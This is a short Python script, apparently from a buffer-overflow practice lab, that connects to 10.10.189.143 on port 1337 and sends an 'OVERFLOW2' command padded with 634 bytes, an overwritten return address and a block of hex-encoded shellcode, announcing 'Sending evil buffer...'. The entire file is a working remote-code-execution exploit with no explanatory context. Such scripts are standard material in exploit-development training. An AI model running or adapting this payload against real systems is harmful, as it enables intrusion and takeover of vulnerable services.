#!/usr/bin/python3

import socket

ip = "10.10.189.143"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
payload = "\xfc\xbb\xfe\x18\x0a\x68\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x02\xf0\x88\x68\xfa\x01\xed\xe1\x1f\x30\x2d\x95\x54\x63\x9d\xdd\x38\x88\x56\xb3\xa8\x1b\x1a\x1c\xdf\xac\x91\x7a\xee\x2d\x89\xbf\x71\xae\xd0\x93\x51\x8f\x1a\xe6\x90\xc8\x47\x0b\xc0\x81\x0c\xbe\xf4\xa6\x59\x03\x7f\xf4\x4c\x03\x9c\x4d\x6e\x22\x33\xc5\x29\xe4\xb2\x0a\x42\xad\xac\x4f\x6f\x67\x47\xbb\x1b\x76\x81\xf5\xe4\xd5\xec\x39\x17\x27\x29\xfd\xc8\x52\x43\xfd\x75\x65\x90\x7f\xa2\xe0\x02\x27\x21\x52\xee\xd9\xe6\x05\x65\xd5\x43\x41\x21\xfa\x52\x86\x5a\x06\xde\x29\x8c\x8e\xa4\x0d\x08\xca\x7f\x2f\x09\xb6\x2e\x50\x49\x19\x8e\xf4\x02\xb4\xdb\x84\x49\xd1\x28\xa5\x71\x21\x27\xbe\x02\x13\xe8\x14\x8c\x1f\x61\xb3\x4b\x5f\x58\x03\xc3\x9e\x63\x74\xca\x64\x37\x24\x64\x4c\x38\xaf\x74\x71\xed\x60\x24\xdd\x5e\xc1\x94\x9d\x0e\xa9\xfe\x11\x70\xc9\x01\xf8\x19\x60\xf8\x6b\x2c\x7c\x13\x5f\x58\x7c\x13\x9f\xd5\x09\xf5\xf5\xf5\x5f\xae\x61\x6f\xfa\x24\x13\x70\xd0\x41\x13\xfa\xd7\xb6\xda\x0b\x9d\xa4\x8b\xfb\xe8\x96\x1a\x03\xc7\xbe\xc1\x96\x8c\x3e\x8f\x8a\x1a\x69\xd8\x7d\x53\xff\xf4\x24\xcd\x1d\x05\xb0\x36\xa5\xd2\x01\xb8\x24\x96\x3e\x9e\x36\x6e\xbe\x9a\x62\x3e\xe9\x74\xdc\xf8\x43\x37\xb6\x52\x3f\x91\x5e\x22\x73\x22\x18\x2b\x5e\xd4\xc4\x9a\x37\xa1\xfb\x13\xd0\x25\x84\x49\x40\xc9\x5f\xca\x60\x28\x75\x27\x09\xf5\x1c\x8a\x54\x06\xcb\xc9\x60\x85\xf9\xb1\x96\x95\x88\xb4\xd3\x11\x61\xc5\x4c\xf4\x85\x7a\x6c\xdd\x85\x7c\x92\xde"
padding = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
except:
        print("Could not connect.")
